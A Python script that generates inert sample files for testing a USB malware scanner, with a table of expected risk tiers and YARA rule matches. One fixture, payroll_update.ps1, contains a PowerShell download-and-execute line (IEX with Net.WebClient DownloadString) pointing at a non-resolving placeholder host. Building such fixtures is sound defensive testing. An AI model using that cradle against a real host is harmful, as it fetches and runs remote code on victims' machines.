"""Build qa_demo/sample_usb_drive/ with INERT demo files and print the expected verdicts.

Nothing here is malware: files are plain text or random/structured bytes that only *look*
suspicious to static checks. Random bytes are seeded so hashes are stable (the offline IOC
list in local_ioc.txt relies on that).
"""

from __future__ import annotations

import hashlib
import random
import struct
import sys
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
DRIVE = HERE / "sample_usb_drive"
IOC_FILE = HERE / "local_ioc.txt"
IOC_TARGET = "holiday_photo.jpg.exe"
XOR_KEY = 0x5A

# relative path -> (expected tier, expected YARA rules)
EXPECTED: dict[str, tuple[str, list[str]]] = {
    "Q3_Financial_Report.pdf": ("SAFE", []),
    "Photos/team_photo.png": ("SAFE", []),
    "meeting_notes.txt": ("SAFE", []),
    "backup_archive.bin": ("SUSPICIOUS", []),
    "Documents/cleanup.bat": ("SUSPICIOUS", []),
    "invoice.pdf": ("CRITICAL", ["Magic_Spoof_Executable"]),
    "holiday_photo.jpg.exe": ("CRITICAL", []),
    "autorun.inf": ("CRITICAL", ["Autorun_Inf_Abuse"]),
    "Documents/payroll_update.ps1": ("CRITICAL", ["Suspicious_PowerShell_Dropper"]),
    "aegis_test_sample.txt": ("CRITICAL", ["Demo_EICAR_Signature"]),
    "Tools/driver_update.exe": ("CRITICAL", ["UPX_Packed_Executable"]),
    "cache/blob.dat": ("CRITICAL", []),
}


def dos_stub(total: int = 2048) -> bytes:
    """A non-runnable fake DOS header + the classic message, zero padded."""
    head = bytearray(b"MZ" + b"\x00" * 0x3E)
    head[0x3C:0x40] = struct.pack("<I", 0x80)
    msg = b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$"
    return bytes(head + msg).ljust(total, b"\x00")


def _png(rng: random.Random, w: int = 128, h: int = 128) -> bytes:
    def chunk(tag: bytes, data: bytes) -> bytes:
        body = tag + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body))

    raw = b"".join(b"\x00" + rng.randbytes(w * 3) for _ in range(h))
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", zlib.compress(raw, 9)) + chunk(b"IEND", b"")


def _pdf() -> bytes:
    return (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )


def build() -> dict[str, bytes]:
    rng = random.Random(1337)
    return {
        "Q3_Financial_Report.pdf": _pdf(),
        "Photos/team_photo.png": _png(rng),
        "meeting_notes.txt": b"Meeting notes\n- Review Q3 numbers\n- Plan offsite\n",
        "backup_archive.bin": rng.randbytes(256 * 1024),
        "Documents/cleanup.bat": b"@echo off\r\necho Cleaning temp files...\r\n",
        "invoice.pdf": b"MZ\x90\x00" + rng.randbytes(16 * 1024),
        "holiday_photo.jpg.exe": b"MZ\x90\x00" + rng.randbytes(8 * 1024),
        "autorun.inf": b"[AutoRun]\nopen=setup.exe\n",
        "Documents/payroll_update.ps1": (
            b"# INERT DEMO TEXT - host is example.invalid and never resolves\r\n"
            b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/p.txt')\r\n"
        ),
        "aegis_test_sample.txt": b"AEGIS-TEST-MALWARE-SIGNATURE-2026\n",
        "Tools/driver_update.exe": b"MZ\x90\x00" + b"\x00" * 60 + b"UPX0\x00\x00\x00\x00UPX1\x00\x00\x00\x00UPX!" + b"\x00" * 512,
        "cache/blob.dat": bytes(b ^ XOR_KEY for b in dos_stub()),
    }


def generate(dest: Path = DRIVE) -> dict[str, tuple[str, list[str]]]:
    """Write all payloads under ``dest`` and refresh local_ioc.txt; return EXPECTED."""
    files = build()
    for rel, data in files.items():
        target = dest / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)
    ioc = hashlib.sha256(files[IOC_TARGET]).hexdigest()
    IOC_FILE.write_text(f"# AEGIS offline IOC list (sha256), demo entry for {IOC_TARGET}\n{ioc}\n")
    return EXPECTED


if __name__ == "__main__":
    generate()
    print(f"Wrote {len(EXPECTED)} inert files to {DRIVE}\n")
    print(f"{'file':34} expected")
    for rel, (tier, rules) in EXPECTED.items():
        print(f"{rel:34} {tier:10} {', '.join(rules)}")
    sys.exit(0)
